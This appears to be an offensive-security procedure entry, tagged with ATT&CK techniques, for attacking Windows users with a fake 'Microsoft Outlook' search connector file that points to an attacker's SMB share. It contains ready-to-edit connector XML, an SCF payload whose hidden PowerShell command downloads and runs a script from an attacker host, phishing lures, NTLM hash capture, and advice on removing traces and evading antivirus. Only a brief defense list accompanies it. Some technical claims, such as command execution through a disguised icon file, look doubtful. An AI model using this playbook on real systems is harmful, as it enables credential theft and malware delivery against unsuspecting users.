---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.478611+00:00'
updated_at: '2023-04-10T20:26:08.872977+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Drive-by Compromise|T1189 - Drive-by Compromise]]'
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques: []
tags:
  - active-directory-attacks
  - scf-and-url-file-attack-against-writeable-share
  - windows-search-connectors-files
commands: []
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# SCF and URL File Attack Against Writable Share via Windows Search Connectors Files

## Summary

This procedure outlines how to craft a malicious Windows Search Connector file (.searchconnector-ms) that references a writable SMB share containing a malicious SCF or URL file. When a target user interacts with the search connector (e.g., by double-clicking or adding it to Windows Search), it triggers a connection to the attacker's share, potentially executing arbitrary code or stealing credentials via the embedded SCF/URL payload. This technique leverages user execution for initial access or lateral movement in Windows environments, often combined with social engineering to deliver the connector file.

## Description

Windows Search Connectors are XML-based files that define custom search scopes, typically for integrating external sources like web services or network locations into the Windows Search interface. In this attack, the XML is manipulated to point the connector's location and icon to a UNC path (\\attacker@port\\share) on a writable SMB share controlled by the attacker. The '@port' syntax (e.g., @8888) can facilitate NTLM relay attacks by forcing authentication over a non-standard port. Upon user interaction, Windows attempts to resolve the icon or enumerate the share, loading any malicious SCF file (disguised as .ico or similar) which contains shell commands for execution, or a .url file that opens a malicious remote resource. This can result in command execution, payload delivery, or credential capture without direct user awareness. The attack targets Windows environments with SMB enabled and relies on write access to a share the victim can browse, making it suitable for phishing or post-compromise persistence in Active Directory networks.

## Requirements

1. Attacker-controlled machine with an SMB share configured (e.g., using Samba on Linux or Windows file sharing) and listening on a custom port like 8888 for potential relay.
2. A malicious SCF or URL file placed on the share (SCF example: [Shell] command=powershell.exe -c 'payload'; URL example: [InternetShortcut] URL=http://malicious.site/payload).
3. Write access to a network share or directory that the target user can access (e.g., via initial foothold or public folder).
4. Basic text editor to create and modify XML files; no special tools required.
5. Target running Windows 7+ with Windows Search enabled and SMB client active.

## Defense

- Disable or restrict Windows Search Connectors via Group Policy (e.g., prohibit .searchconnector-ms file associations or execution).
- Monitor network traffic for suspicious SMB connections to internal hosts on non-standard ports (e.g., 8888) using tools like Sysmon or network IDS.
- Educate users on avoiding files from untrusted sources, especially those mimicking legitimate apps like 'Microsoft Outlook'.
- Implement SMB signing and restrict NTLM authentication to prevent relay attacks.
- Scan shares for anomalous files like SCF/URL with executable content using EDR solutions.

## Objectives

1. Achieve code execution on the target system via user interaction with the search connector.
2. Steal NTLM hashes or credentials during the SMB connection attempt.
3. Deliver malware or escalate privileges by chaining with the SCF/URL payload on the share.

## Instructions

### Step 1: Prepare the Malicious SMB Share and Payload

**Context**: Set up the attacker's share with a malicious SCF or URL file to execute upon connection. This ensures the payload triggers when the search connector loads the icon or enumerates the share.

Create an SMB share named 'folder' on your attacker machine. Place a malicious SCF file named 'folder.ico' (to masquerade as an icon) in the share root. The SCF content should include a [Shell] section with a command like 'command=powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"' for remote payload execution. Alternatively, use a .url file pointing to a malicious site that serves exploits.

**Expected Output**: Share accessible via \\yourhost@8888\folder, with the SCF/URL file present and ready to load.

### Step 2: Create the Malicious Search Connector File

**Context**: Generate the .searchconnector-ms XML file that points to your malicious share, disguising it as a legitimate connector (e.g., for Microsoft Outlook) to entice user interaction.

Use the code snippet [[codes/Malicious-Windows-Search-Connector-XML-for-SCF-Attack]] as the base. Modify the hardcoded values (e.g., replace 'workstation@8888' with your actual host and port, 'folder' with your share name) using a text editor. Save the modified XML content to a file named 'Microsoft-Outlook.searchconnector-ms'.

**Code** ([[codes/Malicious-Windows-Search-Connector-XML-for-SCF-Attack]]):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\workstation@8888\\folder.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\workstation@8888\\folder</url>
    </simpleLocation>
</searchConnectorDescription>
```

> This XML defines a search connector that, when loaded, connects to the specified UNC path. The iconReference triggers loading of the disguised SCF file, executing its commands. Verify the file by opening it in a text editor to ensure XML validity.

**Expected Output**: A valid .searchconnector-ms file that appears as a searchable folder for 'Microsoft Outlook' in Windows Explorer.

### Step 3: Deploy the Search Connector to the Target

**Context**: Place the file on a writable share accessible to the victim and use social engineering to prompt interaction, such as emailing it as an 'updated search plugin' or placing it in a shared folder.

Upload 'Microsoft-Outlook.searchconnector-ms' to the writable share. Instruct the target (via phishing) to double-click the file to 'add the Outlook search connector' or right-click and select 'Add to Search Connectors'.

**Expected Output**: The target system connects to your SMB share (visible in network logs), loads the icon/SCF, and executes the payload without additional prompts if user execution policies allow.

### Step 4: Verify Execution and Cleanup

**Context**: Monitor for successful trigger and cover tracks to maintain access.

Watch your attacker machine for incoming SMB connections from the target's IP. If using a relay (e.g., on port 8888), capture any NTLM hashes. After execution, remove the file from the share if needed to avoid detection.

**Expected Output**: Evidence of payload execution, such as a reverse shell connection or logged credential dump.

**Success Indicators**:
- Incoming SMB connection to your share on the specified port.
- Execution logs or callbacks from the SCF payload (e.g., downloaded script runs).
- No immediate antivirus alerts if the SCF is obfuscated.
